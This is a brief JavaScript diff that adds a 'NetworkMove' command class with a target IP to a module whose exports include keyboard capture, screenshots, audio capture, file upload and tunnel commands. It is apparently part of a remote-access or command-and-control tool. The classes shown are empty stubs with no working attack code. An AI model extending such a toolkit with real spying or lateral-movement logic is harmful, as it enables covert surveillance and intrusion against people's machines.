@@ -97,4 +97,12 @@ class AudioCapture extends Command {
      }
  }
 
-module.exports = {Command, GetKeyboardData, Idle, Ping, Announce, Screenshot, GetSysInfo, UploadFile, GetPublicIp, GetPrivateIp, AudioCapture, InstallTunnel, OpenTunnel }
+ class NetworkMove extends Command {
+     constructor(props) {
+         super(props);
+         this.name = "NetworkMove"
+         this.targetIp = props.targetIp
+     }
+ }
+
+module.exports = {Command,NetworkMove, GetKeyboardData, Idle, Ping, Announce, Screenshot, GetSysInfo, UploadFile, GetPublicIp, GetPrivateIp, AudioCapture, InstallTunnel, OpenTunnel }
